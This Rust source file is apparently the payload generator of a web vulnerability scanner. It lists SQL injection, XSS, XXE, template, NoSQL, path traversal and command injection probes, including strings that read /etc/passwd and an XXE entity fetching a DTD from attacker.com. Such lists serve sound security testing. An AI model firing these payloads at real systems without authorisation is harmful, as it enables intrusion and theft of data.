use crate::Finding;

pub fn generate_payloads(attack_type: &str, count: usize) -> Vec<Finding> {
    let payloads = match attack_type {
        "sqli" => generate_sqli_payloads(count),
        "xss" => generate_xss_payloads(count),
        "xxe" => generate_xxe_payloads(count),
        "ssti" => generate_ssti_payloads(count),
        "nosql" => generate_nosql_payloads(count),
        "lfi" => generate_lfi_payloads(count),
        "cmd" => generate_cmd_payloads(count),
        _ => Vec::new(),
    };

    payloads
        .into_iter()
        .map(|p| Finding {
            finding_type: format!("Generated Payload - {}", attack_type.to_uppercase()),
            severity: "INFO".to_string(),
            param: "payload".to_string(),
            payload: p.clone(),
            detail: format!("Generated {} payload", attack_type),
        })
        .collect()
}

fn generate_sqli_payloads(count: usize) -> Vec<String> {
    let mut payloads = vec![
        "' OR '1'='1".to_string(),
        "' OR '1'='1' --".to_string(),
        "' OR '1'='1' /*".to_string(),
        "admin' --".to_string(),
        "admin' #".to_string(),
        "' UNION SELECT NULL--".to_string(),
        "' UNION SELECT NULL,NULL--".to_string(),
        "1' AND '1'='1".to_string(),
        "1' AND '1'='2".to_string(),
        "' OR 1=1--".to_string(),
    ];

    // Generate variations
    for i in 0..count.saturating_sub(payloads.len()) {
        payloads.push(format!("' OR {}={}--", i, i));
        payloads.push(format!("admin' OR {}={}#", i, i));
    }

    payloads.truncate(count);
    payloads
}

fn generate_xss_payloads(count: usize) -> Vec<String> {
    let mut payloads = vec![
        "<script>alert(1)</script>".to_string(),
        "<img src=x onerror=alert(1)>".to_string(),
        "<svg onload=alert(1)>".to_string(),
        "javascript:alert(1)".to_string(),
        "<iframe src=javascript:alert(1)>".to_string(),
        "<body onload=alert(1)>".to_string(),
        "<input onfocus=alert(1) autofocus>".to_string(),
        "<marquee onstart=alert(1)>".to_string(),
        "<details open ontoggle=alert(1)>".to_string(),
        "'><script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
    ];

    // Generate encoded variations
    for i in 0..count.saturating_sub(payloads.len()) {
        payloads.push(format!("<script>alert({})</script>", i));
        payloads.push(format!("<img src=x onerror=alert({})>", i));
    }

    payloads.truncate(count);
    payloads
}

fn generate_xxe_payloads(count: usize) -> Vec<String> {
    let payloads = vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>"#.to_string(),
    ];

    payloads.into_iter().cycle().take(count).collect()
}

fn generate_ssti_payloads(count: usize) -> Vec<String> {
    let mut payloads = vec![
        "{{7*7}}".to_string(),
        "${7*7}".to_string(),
        "<%= 7*7 %>".to_string(),
        "{{config.items()}}".to_string(),
        "${T(java.lang.Runtime).getRuntime().exec('calc')}".to_string(),
        "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
    ];

    for i in 0..count.saturating_sub(payloads.len()) {
        payloads.push(format!("{{{{{} * {}}}}}", i, i));
    }

    payloads.truncate(count);
    payloads
}

fn generate_nosql_payloads(count: usize) -> Vec<String> {
    let payloads = vec![
        r#"{"$ne": null}"#.to_string(),
        r#"{"$gt": ""}"#.to_string(),
        r#"{"$regex": ".*"}"#.to_string(),
        r#"{"$where": "1==1"}"#.to_string(),
        "' || '1'=='1".to_string(),
        "admin' || 'a'=='a".to_string(),
    ];

    payloads.into_iter().cycle().take(count).collect()
}

fn generate_lfi_payloads(count: usize) -> Vec<String> {
    let mut payloads = vec![
        "../../../etc/passwd".to_string(),
        "..\\..\\..\\windows\\win.ini".to_string(),
        "....//....//....//etc/passwd".to_string(),
        "..%2F..%2F..%2Fetc%2Fpasswd".to_string(),
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
    ];

    for i in 1..count.saturating_sub(payloads.len()) {
        let dots = "../".repeat(i);
        payloads.push(format!("{}etc/passwd", dots));
    }

    payloads.truncate(count);
    payloads
}

fn generate_cmd_payloads(count: usize) -> Vec<String> {
    let mut payloads = vec![
        "; ls -la".to_string(),
        "| whoami".to_string(),
        "& dir".to_string(),
        "`id`".to_string(),
        "$(whoami)".to_string(),
        "; cat /etc/passwd".to_string(),
        "| type C:\\windows\\win.ini".to_string(),
    ];

    for i in 0..count.saturating_sub(payloads.len()) {
        payloads.push(format!("; echo {}", i));
    }

    payloads.truncate(count);
    payloads
}
